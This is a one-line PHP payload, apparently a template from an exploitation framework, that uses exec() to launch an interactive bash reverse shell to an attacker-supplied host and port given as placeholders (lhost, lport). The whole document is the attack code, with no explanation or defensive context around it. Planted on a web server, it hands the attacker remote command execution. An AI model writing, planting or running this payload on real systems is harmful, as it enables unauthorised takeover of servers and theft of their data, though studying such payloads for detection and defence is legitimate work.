<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/{{datastore.lhost}}/{{datastore.lport}} 0>&1'");
